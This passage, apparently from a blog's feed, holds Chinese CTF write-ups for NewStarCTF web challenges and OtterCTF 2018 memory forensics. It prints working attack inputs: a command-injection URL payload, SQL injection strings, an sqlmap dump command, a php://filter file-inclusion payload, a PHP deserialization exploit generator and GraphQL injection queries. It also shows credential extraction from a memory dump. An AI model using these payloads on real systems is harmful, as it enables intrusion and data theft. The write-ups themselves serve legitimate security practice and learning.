class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Number error!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Wrong Key!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Pass it!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> Pass it<span class="token operator">!</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">[GET]?data=data://text/plain;base64,V2VsY29tZSB0byBDVEY=&amp;key1[]=1&amp;key2[]=2&amp;cmd=%0aecho `tac /flag`;[POST]num=2077a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="5-Word-For-You"><a href="#5-Word-For-You" class="headerlink" title="5. Word-For-You"></a>5. Word-For-You</h3><p>使用万能密码</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">1' or 1=1 -- qwe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在内容最下面获得 flag</p>]]></content>
      
      
      <categories>
          
          <category> CTF 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> NewStarCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NewStarCTF Week 2</title>
      <link href="/2023/01/21/catchtheflag/games/newstarctf/newstarctf-week-2/"/>
      <url>/2023/01/21/catchtheflag/games/newstarctf/newstarctf-week-2/</url>
      
        <content type="html"><![CDATA[<h1 id="NewStarCTF-Week-2"><a href="#NewStarCTF-Week-2" class="headerlink" title="NewStarCTF Week 2"></a>NewStarCTF Week 2</h1><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="1-Word-For-You-2-Gen"><a href="#1-Word-For-You-2-Gen" class="headerlink" title="1. Word-For-You(2 Gen)"></a>1. Word-For-You(2 Gen)</h3><p>使用 sqlmap</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 .<span class="token punctuation">\</span>sqlmap.py <span class="token parameter variable">-u</span> <span class="token string">"http://12102e7b-bee4-4adb-a43e-2768c2920069.node4.buuoj.cn:81/comments.php"</span> <span class="token parameter variable">--data</span> <span class="token string">"name=1"</span> --random-agent <span class="token parameter variable">--dbms</span> <span class="token string">"MySQL"</span> <span class="token parameter variable">-D</span> <span class="token string">"wfy"</span> <span class="token parameter variable">-T</span> wfy_comments <span class="token parameter variable">--dump</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020221017153454.png"></p><h3 id="2-IncludeOne"><a href="#2-IncludeOne" class="headerlink" title="2. IncludeOne"></a>2. IncludeOne</h3><p>题目源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"seed.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//mt_srand(*********);</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"Hint: "</span><span class="token operator">.</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'guess'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'guess'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/base|\.\./i"</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/NewStar/i"</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token comment">//flag in `flag.php`</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Baby Hacker?"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"No Hacker!"</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用 php_mt_seed 爆破随机数种子</p><p><img src="/../../../../pic/Pasted%20image%2020221017154535.png"></p><p>获得种子 1145146</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">php <span class="token operator">-</span>r <span class="token string double-quoted-string">"mt_srand(1145146);mt_rand();echo mt_rand();"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>payload</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">[GET]?file=php://filter/string.rot13|NewStar/resource=flag.php[POST]guess=1202031004<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查看源码，将结果再使用 rot13 处理，获得 flag</p><p><img src="/../../../../pic/Pasted%20image%2020221017154729.png"></p><h3 id="3-UnserializeOne"><a href="#3-UnserializeOne" class="headerlink" title="3. UnserializeOne"></a>3. UnserializeOne</h3><p>题目源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#Something useful for you : https://zhuanlan.zhihu.com/p/377676274</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Start</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$func</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Welcome to NewStarCTF, "</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">name</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__isset</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">func</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Sec</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$var</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">obj</span><span class="token operator">-&gt;</span><span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string double-quoted-string">"CTFers"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Easy</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$cla</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$fun</span><span class="token punctuation">,</span> <span class="token variable">$var</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">cla</span> <span class="token operator">=</span> <span class="token keyword">clone</span> <span class="token variable">$var</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">eeee</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">obj</span><span class="token operator">-&gt;</span><span class="token property">cmd</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"success"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>生成  EXP</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Start</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$func</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Sec</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$var</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Easy</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$cla</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">eeee</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$obj</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$o</span><span class="token operator">-&gt;</span><span class="token property">name</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Sec</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$o</span><span class="token operator">-&gt;</span><span class="token property">name</span><span class="token operator">-&gt;</span><span class="token property">obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Easy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$o</span><span class="token operator">-&gt;</span><span class="token property">name</span><span class="token operator">-&gt;</span><span class="token property">var</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">eeee</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$o</span><span class="token operator">-&gt;</span><span class="token property">name</span><span class="token operator">-&gt;</span><span class="token property">var</span><span class="token operator">-&gt;</span><span class="token property">obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$o</span><span class="token operator">-&gt;</span><span class="token property">name</span><span class="token operator">-&gt;</span><span class="token property">var</span><span class="token operator">-&gt;</span><span class="token property">obj</span><span class="token operator">-&gt;</span><span class="token property">func</span> <span class="token operator">=</span> <span class="token keyword">new</span>  <span class="token class-name">Sec</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>POST 提交后获得 flag</p><h3 id="4-ezApi"><a href="#4-ezApi" class="headerlink" title="4. ezApi"></a>4. ezApi</h3><p>#graphql注入</p><p>访问 /<a href="http://www.zip下载到题目源码/">www.zip下载到题目源码</a></p><p>存在对 id 的过滤，限制 id 为数字，对 data 没有过滤处理，后端拿到 data 之后作为查询语句使用 graphql 进行数据库查询操作，构造语句查询即可</p><p>获取字段信息</p><pre class="line-numbers language-none"><code class="language-none">id=0&amp;data={"query":"query __schema{__schema{types{name}}}","variables":null}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>存在 flag 字段，查询字段中的详细信息</p><pre class="line-numbers language-none"><code class="language-none">id=0&amp;data={"query":"query __schema{__type(name:\"ffffllllaaagggg_1n_h3r3_flag\"){name fields{name type {name kind ofType{name kind}}}}}","variables":null}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>存在 flag 字段，类型为 string</p><p>读取 flag</p><pre class="line-numbers language-none"><code class="language-none">id=0&amp;data={"query":"query{ffffllllaaagggg_1n_h3r3_flag{flag}}","variables":null}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> NewStarCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OtterCTF 2018</title>
      <link href="/2023/01/21/catchtheflag/games/otterctf/otterctf-2018/"/>
      <url>/2023/01/21/catchtheflag/games/otterctf/otterctf-2018/</url>
      
        <content type="html"><![CDATA[<h1 id="OtterCTF-2018"><a href="#OtterCTF-2018" class="headerlink" title="OtterCTF 2018"></a>OtterCTF 2018</h1><h2 id="内存取证"><a href="#内存取证" class="headerlink" title="内存取证"></a>内存取证</h2><p>#内存取证 </p><h3 id="What-the-password"><a href="#What-the-password" class="headerlink" title="What the password?"></a>What the password?</h3><ul><li>题目描述</li></ul><p>you got a sample of rick’s PC’s memory. can you get his user password?</p><ul><li>题目解析</li></ul><p>题目要我们去获取用户的密码</p><p>先获取下内存的系统版本</p><pre class="line-numbers language-none"><code class="language-none">python3 vol.py -f OtterCTF.vmem windows.info<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020230302204510.png"></p><p>目标为用户密码，这里使用 lsadump 读取用户密码</p><pre class="line-numbers language-none"><code class="language-none">python3 vol.py -f OtterCTF.vmem windows.lsadump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020230302204548.png"></p><p>获得用户密码 </p><p>MortyIsReallyAnOtter</p><h3 id="General-Info"><a href="#General-Info" class="headerlink" title="General Info"></a>General Info</h3><p>#注册表</p><ul><li>题目描述</li></ul><p>Let’s start easy - whats the PC’s name and IP address?</p><ul><li>题目解析</li></ul><p>让我们去找 PC 的名字以及 IP 地址</p><p>在注册表 <code>MACHINE\SYSTEM\ControlSet001\Control\ComputerName\ComputerName</code> 字段中存有主机名</p><pre class="line-numbers language-none"><code class="language-none">python3 vol.py -f OtterCTF.vmem windows.registry.printkey  --key "ControlSet001\Control\ComputerName\ComputerName"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020230302205821.png"></p><p>获得主机名 WIN-LO6FAF3DTFE</p><p>获取 IP 地址可以扫描下网络信息</p><pre class="line-numbers language-none"><code class="language-none">python3 vol.py -f OtterCTF.vmem windows.netscan<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020230302205931.png"></p><p>获得 IP 地址 192.168.202.131</p><p>组合 flag 为 <code>WIN-LO6FAF3DTFE-192.168.202.131</code></p><h3 id="Play-Time"><a href="#Play-Time" class="headerlink" title="Play Time"></a>Play Time</h3><p>#进程列表</p><ul><li>题目描述</li></ul><p>Rick just loves to play some good old videogames.<br>can you tell which game is he playing?<br>whats the IP address of the server?</p><ul><li>题目解析</li></ul><p>要去找到游戏名以及游戏服务器的 IP 地址</p><p>查看下进程列表</p><pre class="line-numbers language-none"><code class="language-none">python3 vol.py -f OtterCTF.vmem windows.pslist<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020230302210759.png"></p><p><img src="/../../../../pic/Pasted%20image%2020230302210748.png"></p><p>找到游戏名为 LunarMS</p><p>根据 PID 查看网络连接</p><pre class="line-numbers language-none"><code class="language-none">python3 vol.py -f OtterCTF.vmem windows.netscan | findstr "708"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020230302211308.png"></p><p>获得游戏服务器 IP 地址为 77.102.199.102</p><p>组合获得 flag 为 <code>LunarMS-77.102.199.102</code></p><h3 id="Silly-Rick"><a href="#Silly-Rick" class="headerlink" title="Silly Rick"></a>Silly Rick</h3><p>#剪切板</p><ul><li>题目描述</li></ul><p>Silly rick always forgets his email’s password, so he uses a Stored Password Services online to store his password. He always copy and paste the password so he will not get it wrong. whats rick’s email password?</p><ul><li>题目解析</li></ul><p>根据题目可知将密码复制到了剪切板中</p><p>这里使用 volatility2 中的 clipboard 模块读取剪切板</p><p><img src="/../../../../pic/Pasted%20image%2020230302212218.png"></p><p>获得 flag  为 <code>M@il_Pr0vid0rs</code></p><h3 id="Name-Game"><a href="#Name-Game" class="headerlink" title="Name Game"></a>Name Game</h3><ul><li>题目描述</li></ul><p>We know that the account was logged in to a channel called Lunar-3. what is the account name?</p><ul><li>题目解析</li></ul><p>在登录过程中，账号可能会以明文的形式储存在内存之中，我们便可以利用 <code>grep</code> 指令筛选出所有的可打印句子，然后通过关键词 <code>Lunar-3</code> 来定位账号名可能会出现的地方</p><p>将 LunarMS.exe 进程的内存数据导出来</p><pre class="line-numbers language-none"><code class="language-none">volatility_2.6_win64_standalone.exe -f OtterCTF.vmem --profile Win7SP1x64 memdump --pid 708 --dump-dir ./output/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020230302213008.png"></p><p>读取其中的字符串</p><pre class="line-numbers language-none"><code class="language-none">strings 708.dmp  | grep -C 10 "Lunar-3"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020230302213034.png"></p><p>获得 flag 为 <code>0tt3r8r33z3</code></p><h3 id="Hide-And-Seek"><a href="#Hide-And-Seek" class="headerlink" title="Hide And Seek"></a>Hide And Seek</h3><ul><li>题目描述</li></ul><p>The reason that we took rick’s PC memory dump is because there was a malware infection. Please find the malware process name (including the extension)</p><ul><li>题目解析</li></ul><p>翻译一下就是找出恶意进程的名字</p><p>进程就那几个，一个一个尝试都行</p><p><img src="/../../../../pic/Pasted%20image%2020230302214546.png"></p><p>可以看到，看似无害的 <code>vmware-tray.exe</code> 进程，他的父进程是 <code>Rick And Morty.exe</code>，这是非常不对劲的，可以怀疑这个 <code>vmware-tray.exe</code> 进程实际上是恶意软件释放出来的子进程</p><p>通过<code>cmdline</code>模块，可以追踪到程序的调用指令</p><p><img src="/../../../../pic/Pasted%20image%2020230302214838.png"></p><p>这里得到的 flag 为 <code>vmware-tray.exe</code></p><h3 id="Name-Game-2"><a href="#Name-Game-2" class="headerlink" title="Name Game 2"></a>Name Game 2</h3><ul><li>题目描述</li></ul><p>From a little research we found that the username of the logged on character is always after this signature: 0x64 0x??{6-8} 0x40 0x06 0x??{18} 0x5a 0x0c 0x00{2}<br>What’s rick’s character’s name?</p><ul><li>题目解析</li></ul><p>提取之前导出的 LunarMS.exe 进程的内存数据的十六进制值并进行匹配</p><pre class="line-numbers language-none"><code class="language-none">hexdump -C 708.dmp | grep -C 1 "5a 0c 00 00"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020230302215821.png"></p><p>获得 flag 为 <code>M0rtyL0L</code></p><h3 id="Path-To-Glory"><a href="#Path-To-Glory" class="headerlink" title="Path To Glory"></a>Path To Glory</h3><ul><li>题目描述</li></ul><p>How did the malware got to rick’s PC? It must be one of rick old illegal habits…</p><ul><li>题目解析</li></ul><p>之前在进程列表中发现存在种子下载工具，推测为通过种子下载下来恶意文件</p><p>全局搜索一下种子位置</p><pre class="line-numbers language-none"><code class="language-none">python3 vol.py -f OtterCTF.vmem windows.filescan | grep "Rick And Morty"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020230302221629.png"></p><p>导出来查看其文件内容</p><pre class="line-numbers language-none"><code class="language-none">python3 vol.py -f OtterCTF.vmem windows.dumpfile --physaddr 0x7dae9350<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020230302222459.png"></p><p>读取其内容</p><pre class="line-numbers language-none"><code class="language-none">strings "file.0x7dae9350.0xfa801b42c9e0.DataSectionObject.Rick And Morty season 1 download.exe.1.torrent.dat"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020230302222515.png"></p><p>获得 flag 为 M3an_T0rren7_4_R!ck</p><h3 id="Bit-4-Bit"><a href="#Bit-4-Bit" class="headerlink" title="Bit 4 Bit"></a>Bit 4 Bit</h3><ul><li>题目描述</li></ul><p>We’ve found out that the malware is a ransomware. Find the attacker’s bitcoin address.</p><ul><li>题目解析</li></ul><p>目标是获得攻击者的比特币地址</p><p>现将恶意软件导出来</p><pre class="line-numbers language-none"><code class="language-none">python3 vol.py -f OtterCTF.vmem windows.pslist --pid 3720 --dump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后反编译查看</p><p><img src="/../../../../pic/Pasted%20image%2020230302224217.png"></p><p>获得 flag 为 <code>1MmpEmebJkqXG8nQv4cjJSmxZQFVmFo63M</code></p><h3 id="Path-To-Glory-2"><a href="#Path-To-Glory-2" class="headerlink" title="Path To Glory 2"></a>Path To Glory 2</h3><ul><li>题目描述</li></ul><p>Continue the search after the way that malware got in.</p><ul><li>题目解析</li></ul><p>这里把所有 chrome 的进程导出然后提取字符串</p><h3 id="Recovery"><a href="#Recovery" class="headerlink" title="Recovery"></a>Recovery</h3><ul><li>题目描述</li></ul><p>Rick got to have his files recovered! What is the random password used to encrypt the files?</p><ul><li>题目解析</li></ul><p>要我们获得用于加密的密码</p><p>分析exe可以看到两个函数，第一个创建密码是随机的，然后有一个发送密码，是把computerName和userName还有password拼接以后进行发送</p><p>可以分析出compuerName就是WIN-LO6FAF3DTFE，用户名是Rick，所以这个函数发送的字符串应该是 WIN-LO6FAF3DTFE-Rick password，我们直接去这个勒索软件的内存中寻找相关字符串即可</p><pre class="line-numbers language-none"><code class="language-none">strings -el ./3720.dmp | grep 'WIN-LO6FAF3DTFE-Rick' -C 5<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020230302225817.png"></p><p>获得 flag 为 <code>aDOBofVYUNVnmp7</code></p><h3 id="Graphic’s-For-The-Weak"><a href="#Graphic’s-For-The-Weak" class="headerlink" title="Graphic’s For The Weak"></a>Graphic’s For The Weak</h3><ul><li>题目描述</li></ul><p>There’s something fishy in the malware’s graphics.</p><ul><li>题目解析</li></ul><p>使用 foremost 分离应用获得图片</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">foremost executable.3720.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020230302230053.png"></p><p>获得 flag 为 <code>S0_Just_M0v3_Socy</code></p><h3 id="Closure"><a href="#Closure" class="headerlink" title="Closure"></a>Closure</h3><ul><li>题目描述</li></ul><p>Now that you extracted the password from the memory, could you decrypt rick’s files?</p><ul><li>题目解析</li></ul><p>被加密的文件为 flag.txt ，先把 flag.txt 导出</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">volatility_2.6_win64_standalone.exe  -f OtterCTF.vmem --profile Win7SP1x64 dumpfiles -Q 0x000000007e410890 -D ./output<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将末尾多余的 0 都去掉然后修改后缀为 locked</p><p>使用解密工具 <a href="https://www.bleepingcomputer.com/download/hidden-tear-decrypter/dl/327/">HiddenTearDecrypter</a> 使用之前获得的密码进行解密，建议再虚拟机里面使用</p><p><img src="/../../../../pic/Pasted%20image%2020230302232541.png"><br><img src="/../../../../pic/Pasted%20image%2020230302232546.png"></p><p>获得 flag 为 <code>{Im_Th@_B3S7_RicK_0f_Th3m_4ll}</code></p>]]></content>
      
      
      <categories>
          
          <category> CTF 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> October </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SWPUCTF 2021 新生赛</title>
      <link href="/2023/01/21/catchtheflag/games/swpuctf/swpuctf-2021-xin-sheng-sai/"/>
      <url>/2023/01/21/catchtheflag/games/swpuctf/swpuctf-2021-xin-sheng-sai/</url>
      
